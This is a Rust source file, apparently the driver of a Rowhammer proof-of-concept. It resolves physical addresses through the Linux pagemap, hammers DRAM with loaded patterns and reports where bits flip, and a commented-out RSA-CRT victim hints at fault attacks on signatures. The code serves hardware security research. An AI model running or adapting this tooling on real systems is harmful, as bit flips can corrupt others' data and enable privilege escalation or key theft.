use bs_poc::memory::LinuxPageMap;
use bs_poc::memory::Memory;
use bs_poc::memory::VirtToPhysResolver;
use bs_poc::victim::RsaCrt;
use clap::Parser;

use bs_poc::forge::Hammerer;

use bs_poc::util::{BlacksmithConfig, MemConfiguration};
use rand::rngs::StdRng;

/// Search for a pattern in a file and display the lines that contain it.
#[derive(Debug, Parser)]
struct CliArgs {
    /// The JSON file containing the memory config
    #[clap(long = "config", default_value = "config.json")]
    config: String,
    /// The JSON file containing hammering patterns to load
    #[clap(long = "load-json", default_value = "fuzz-summary.json")]
    load_json: String,
    /// The pattern ID to load from the JSON file
    #[clap(long = "pattern")]
    pattern: String,
}

#[macro_use]
extern crate log;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::init();
    info!("startup");
    let args = CliArgs::parse();
    info!("args: {:?}", args);

    const MEM_SIZE: usize = 1 << 30; // 1 GB

    let memory = Memory::new(MEM_SIZE)?;

    info!("allocated {} B of memory", MEM_SIZE);

    let mut resolver = LinuxPageMap::new()?;
    let phys = resolver.get_phys(memory.addr as u64);
    match phys {
        Ok(phys) => info!("phys base_msb: 0x{:02X}", phys),
        Err(err) => warn!("Failed to determine physical address: {}", err),
    }

    // check memory.start phys addr

    let config = BlacksmithConfig::from_jsonfile(&args.config)?;
    let mem_config =
        MemConfiguration::from_bitdefs(config.bank_bits, config.row_bits, config.col_bits);
    let hammerer = Hammerer::new(
        mem_config,
        args.load_json.clone(),
        args.pattern.clone(),
        memory.addr.clone(),
    )?;
    info!("initialized hammerer");

    //RSA-CRT
    //let sig = rsa.sign(msg);
    //let mut check = rsa.verify(msg, &sig);
    /*let _init = |rsa: Option<RsaCrt>| {
        if let Some(rsa) = rsa {
            return rsa;
        }
        let mut rng = rand::thread_rng();
        let mut r = RsaCrt::new(&memory, &mut rng).unwrap();
        return r;
    };*/
    info!("start hammering");
    let init = |_| {
        let seed = rand::random();
        memory.initialize::<StdRng>(seed);
        seed
    };
    let check = |seed| memory.check::<StdRng>(mem_config, seed);
    loop {
        let result = hammerer.hammer(init, check)?;
        println!(
            "Flipped at run {} after {} attempts with seed {:?} at {:?}",
            result.run, result.attempt, result.state, result.result,
        );
        let virt_addrs: Vec<String> = result
            .result
            .iter()
            .map(|bf| bf.dram_addr.to_virt(memory.addr, mem_config))
            .map(|addr| format!("0x{:02X}", addr as usize))
            .collect();
        println!("Addresses with flips: {:?}", virt_addrs);
    }
}
